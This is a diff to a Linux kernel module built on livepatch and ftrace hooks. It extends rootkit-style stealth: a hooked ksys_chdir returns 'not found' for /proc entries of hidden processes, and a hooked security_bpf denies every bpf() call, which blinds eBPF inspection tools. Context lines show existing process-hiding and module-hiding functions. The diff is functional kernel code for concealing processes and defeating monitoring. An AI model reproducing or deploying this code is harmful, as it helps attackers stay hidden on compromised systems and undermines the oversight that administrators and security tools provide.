@@ -14,6 +14,7 @@
 #include <linux/kallsyms.h>
 #include <linux/fs.h>
 #include <linux/file.h>
+#include <linux/mount.h>
 #include <linux/proc_fs.h>
 #include <linux/proc_ns.h>
 #include <linux/refcount.h>
@@ -34,6 +35,8 @@
 #include <linux/version.h>
 #include <linux/icmp.h>
 #include <linux/mempolicy.h>
+#include <linux/namei.h>
+//#include "fs/proc/internal.h"
 #include "ftrace_hook.h"
 
 
@@ -53,10 +56,12 @@ struct klp_ops {
         struct ftrace_ops fops;
 };
 
+#if 0
 struct ftrace_func_entry {
         struct hlist_node hlist;
         unsigned long ip;
 };
+#endif
 
 struct ftrace_hash {
         unsigned long           size_bits;
@@ -215,12 +220,28 @@ static int is_hidden_proc_name(const char *name, int len_name)
 	for (i = 0; i < num_proc_name; i++) {
 		if (hidden_proc_name[i] == NULL)
 			break;
-		if (strncmp(name, hidden_proc_name[i], len_name) == 0)
+		if (strncmp(name, hidden_proc_name[i], len_name) == 0) {
 			return 1;
+		}
 	}
 
 end:
 	return 0;
+}
+
+static void print_hidden_proc_name(void)
+{
+	int i = 0;
+
+	printk(KERN_INFO "hidden_proc_name:");
+	for (i = 0; i < num_proc_name; i++) {
+		if (hidden_proc_name[i] == NULL)
+			break;
+		printk(KERN_INFO " %s", hidden_proc_name[i]);
+	}
+	printk(KERN_INFO "\n");
+
+	return;
 }
 
 static int is_hidden_proc(struct task_struct *task) 
@@ -618,6 +639,77 @@ static int livepatch_do_getpgid(pid_t pid)
 out:
         rcu_read_unlock();
         return retval;
+}
+
+
+static void (*p_set_fs_pwd)(struct fs_struct *fs, const struct path *path) = NULL;
+static struct task_struct *(*p_find_get_task_by_vpid)(pid_t nr) = NULL;
+static struct filename * (*p_getname)(const char __user * filename)  = NULL;
+static void (*p_putname)(struct filename *name) = NULL;
+
+static int livepatch_ksys_chdir(const char __user *filename)
+{
+        struct path path;
+        int error = 0;
+        unsigned int lookup_flags = LOOKUP_FOLLOW | LOOKUP_DIRECTORY;
+retry:
+        error = user_path_at(AT_FDCWD, filename, lookup_flags, &path);
+        if (error)
+                goto out;
+
+	if (strcmp(path.mnt->mnt_sb->s_type->name, "proc") == 0) {
+		char *str = NULL;
+		char *p = NULL;
+		struct task_struct *task = NULL;
+		pid_t pid = 0;
+		struct filename *name = p_getname(filename);
+		if (name)
+			p = (char *)name->name;
+
+		while (p && (str = strsep(&p, "/")) != NULL) {
+			if (strlen(str) == 0)
+				continue;
+			pid = 0;
+			if (sscanf(str, "%d", &pid) != 1 || pid <= 0)
+				continue;
+
+			task = p_find_get_task_by_vpid(pid);
+			if (task) { 
+				if (is_hidden_proc(task)) 
+					error = -ENOENT;
+				put_task_struct(task);
+				if (error)
+					break;  
+			}
+		}
+		if (name)
+			p_putname(name);
+
+		if (error) {
+			path_put(&path);
+			goto out;
+		}
+	}
+
+        error = inode_permission(path.dentry->d_inode, MAY_EXEC | MAY_CHDIR);
+        if (error)
+                goto dput_and_out;
+        
+        p_set_fs_pwd(current->fs, &path);
+
+dput_and_out:
+        path_put(&path);
+        if (retry_estale(error, lookup_flags)) {
+                lookup_flags |= LOOKUP_REVAL;
+                goto retry;
+        }
+out:
+        return error;
+}
+
+static int livepatch_security_bpf(int cmd, union bpf_attr *attr, unsigned int size)
+{
+	return -EPERM;
 }
 
 static void hidden_module(struct module *mod) {
@@ -1817,6 +1909,16 @@ static struct klp_func funcs[] = {
 		.old_name = "do_getpgid",
 		.new_func = livepatch_do_getpgid,
 	}, 
+	{
+		// sys_chdir
+		.old_name = "ksys_chdir",
+		.new_func = livepatch_ksys_chdir,
+	}, 
+	{
+		// sys_bpf
+		.old_name = "security_bpf",
+		.new_func = livepatch_security_bpf,
+	}, 
 	{ }
 };
 
@@ -2037,6 +2139,25 @@ static int livepatch_init(void)
 	p_kernel_text_address = (int (*)(unsigned long addr))
 				 kallsyms_lookup_name("kernel_text_address");
 	if (!p_kernel_text_address)
+		return -1;
+
+	p_set_fs_pwd = (void (*)(struct fs_struct *fs, const struct path *path))
+				 kallsyms_lookup_name("set_fs_pwd");
+	if (!p_set_fs_pwd)
+		return -1;
+
+	p_putname = (void (*)(struct filename *name))
+				 kallsyms_lookup_name("putname");
+	if (!p_putname)
+		return -1;
+	p_getname = (struct filename * (*)(const char __user * filename))
+				 kallsyms_lookup_name("getname");
+	if (!p_getname)
+		return -1;
+
+	p_find_get_task_by_vpid = (struct task_struct *(*)(pid_t nr)) 
+				 kallsyms_lookup_name("find_get_task_by_vpid");
+	if (!p_find_get_task_by_vpid)
 		return -1;
 
 	fh_install_hooks(hooks, ARRAY_SIZE(hooks));
